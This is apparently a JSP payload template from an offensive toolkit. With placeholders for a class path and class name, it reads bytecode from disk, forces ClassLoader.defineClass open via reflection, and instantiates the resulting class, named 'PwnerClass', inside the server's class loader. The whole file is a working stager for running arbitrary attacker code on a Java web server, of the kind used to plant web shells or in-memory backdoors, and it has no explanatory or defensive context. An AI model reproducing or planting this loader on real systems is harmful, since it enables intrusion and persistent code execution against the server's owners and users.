<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.lang.reflect.Method" %>
<%
    try {
        String classPath = "%classPath%";
        String className = "%className%";
        byte[] b = Files.readAllBytes(Paths.get(classPath));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
            String.class,
            byte[].class,
            int.class,
            int.class
        );
        defineClass.setAccessible(true);
        Class PwnerClass = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), className, b, 0, b.length);
        PwnerClass.newInstance();
    }catch (Exception e){
        e.printStackTrace();
    }
%>
